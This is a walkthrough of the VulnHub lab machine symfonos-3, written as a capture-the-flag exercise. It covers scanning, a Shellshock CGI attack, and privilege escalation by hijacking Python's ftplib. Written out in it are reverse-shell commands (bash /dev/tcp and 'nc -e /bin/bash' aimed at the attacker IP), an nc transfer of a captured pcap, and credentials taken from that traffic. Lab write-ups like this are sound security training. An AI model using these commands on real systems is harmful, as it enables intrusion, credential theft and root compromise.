# symfonos-3
![](https://i.imgur.com/j47hNId.png)

![](https://i.imgur.com/mROVgn1.png)

## Scanning
### nmap
```
$ nmap -p- -A -T5 192.168.109.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 02:22 EDT
Nmap scan report for symfonos.local (192.168.109.133)
Host is up (0.00082s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.37 seconds
```

### http
```
$ http 192.168.109.133
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 189
Content-Type: text/html
Date: Sun, 08 Aug 2021 06:24:33 GMT
ETag: "f1-58e15fe4052c8-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Sat, 20 Jul 2019 05:19:54 GMT
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding

<html>
<head>
<style>
html,body{
    margin:0;
    height:100%;
}
img{
  display:block;
  width:100%; height:100%;
  object-fit: cover;
}
</style>
</head>
<body>

<img src="image.jpg">

<!-- Can you bust the underworld? -->

</body>
</html>
```

### dirsearch
* big.txt
```
$ dirsearch -u http://192.168.109.133 -w /usr/share/dirb/wordlists/common.txt              

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 30 | Wordlist size: 4613

Output File: /home/jack/.dirsearch/reports/192.168.109.133/_21-08-08_02-27-13.txt

Error Log: /home/jack/.dirsearch/logs/errors-21-08-08_02-27-13.log

Target: http://192.168.109.133/

[02:27:13] Starting: 
[02:27:14] 403 -  280B  - /cgi-bin/                        
[02:27:15] 301 -  317B  - /gate  ->  http://192.168.109.133/gate/
[02:27:15] 200 -  241B  - /index.html                 
[02:27:17] 403 -  280B  - /server-status                  
                                                            
Task Completed

```
* directory-list-2.3-medium.txt
```
$ dirsearch -u http://192.168.109.133/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e txt,php -t 200

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, php | HTTP method: GET | Threads: 200
Wordlist size: 220520

Output File: /home/jack/.dirsearch/reports/192.168.109.133/cgi-bin_21-08-08_02-29-09.txt

Error Log: /home/jack/.dirsearch/logs/errors-21-08-08_02-29-09.log

Target: http://192.168.109.133/cgi-bin/

[02:29:09] Starting: 
[02:30:20] 200 -   62B  - /cgi-bin/underworld 
...
```
### chrome
![](https://i.imgur.com/ra77uPI.png)

## Gain Access
### Shellshock
* [Bash - 'Shellshock' Environment Variables Command Injection](https://www.exploit-db.com/exploits/34766)

### Reverse Shell
```
$ php exp.php -u http://symfonos.local/cgi-bin/underworld/ -c "/bin/bash -c 'exec bash -i &>/dev/tcp/192.168.109.128/8787 <&1'"
```
```
$ nc -lvp 8787
```

## Privilege Escalation
### tcpdump
```
$ cd /tmp
cd /tmp
$ tcpdump -D
tcpdump -D
1.ens33 [Up, Running]
2.any (Pseudo-device that captures on all interfaces) [Up, Running]
3.lo [Up, Running, Loopback]
4.nflog (Linux netfilter log (NFLOG) interface)
5.nfqueue (Linux netfilter queue (NFQUEUE) interface)
6.usbmon1 (USB bus number 1)
7.usbmon2 (USB bus number 2)
$ tcpdump -w file.pcap -i lo
tcpdump -w file.pcap -i lo
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
```
* We send file.pcap to our machine to analysis.
```
$ nc 192.168.109.128 8080 < file.pcap
nc 192.168.109.128 8080 < file.pcap
```
```
$  nc -lvp 8080 > file.pcap
listening on [any] 8080 ...
connect to [192.168.109.128] from symfonos.local [192.168.109.133] 58604
```
### wireshark
* We found username **hades** and password **PTpZTfU4vxgzvRBE**.

![](https://i.imgur.com/QZhGVdR.png)

### ssh
```
$ ssh hades@192.168.109.133
```
### pspy32
* We send pspy32 to target machine.
```
$ nc 192.168.109.133 8080 < pspy32
```
```
$ nc -lvp 8080 > pspy32
```
* Then, we run pspy32.
```
$ chmod 777 pspy32
$ ./pspy32
...
2021/08/08 02:42:01 CMD: UID=0    PID=2460   | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
...
```
### ftpclient
```
$ cd /opt/ftpclient/
$ ls -la
total 16
drwxr-x--- 2 root hades 4096 Apr  6  2020 .
drwxr-xr-x 3 root root  4096 Jul 20  2019 ..
-rw-r--r-- 1 root hades  262 Apr  6  2020 ftpclient.py
-rw-r--r-- 1 root hades  251 Aug  8 02:45 statuscheck.txt
$ cat ftpclient.py 
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```
### ftplib
```
$ cd /usr/lib/python2.7/
$ ls -l ftplib.py
-rwxrw-r-- 1 root gods 37755 Sep 26  2018 ftplib.py
$ groups hades
hades : hades gods
$ echo "
> import os
> os.system('nc -e /bin/bash 192.168.109.128 9090')" > ftplib.py
$ cat ftplib.py
import os
os.system('nc -e /bin/bash 192.168.109.128 9090')
```
### ftpclient
```
$ cd /opt/ftpclient/
$ ./ftpclient.py
-bash: ./ftpclient.py: Permission denied
```
```
$ nc -lvp 9090            
listening on [any] 9090 ...
connect to [192.168.109.128] from symfonos.local [192.168.109.133] 54918
id
uid=0(root) gid=0(root) groups=0(root)
```

## Reference
* [vulnhub - SYMFONOS: 3.1](https://www.vulnhub.com/entry/symfonos-31,332/)
* [Hacking Articles - Symfonos:3 Vulnhub Walkthrough](https://www.hackingarticles.in/symfonos3-vulnhub-walkthrough/)
* [blog.mzfr.me - Vulnhub - Symfonos 3 writeup](https://blog.mzfr.me/vulnhub-writeups/2019-07-20-symfonos3)
* [hack-tips - Vulnhub – Symfonos 3 Walkthrough](https://hack-tips.com/2020/04/25/vulnhub-symfonos-3-walkthrough/)